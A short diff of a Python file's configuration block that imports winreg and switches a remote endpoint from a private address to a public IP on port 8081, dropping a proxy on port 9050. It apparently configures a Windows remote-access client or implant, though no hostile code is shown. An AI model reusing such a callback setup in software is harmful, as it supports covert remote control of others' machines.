@@ -10,10 +10,8 @@ from random import randint, uniform
 import winreg
 
 UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
-remote_ip = '10.0.0.18'
+remote_ip = '134.209.206.142'
 remote_port = 8081
-proxy_ip = '201.94.250.116'
-proxy_port = 9050
 server_sni_hostname = ''
 VERBOSE = True
 DEVNULL = subprocess.DEVNULL
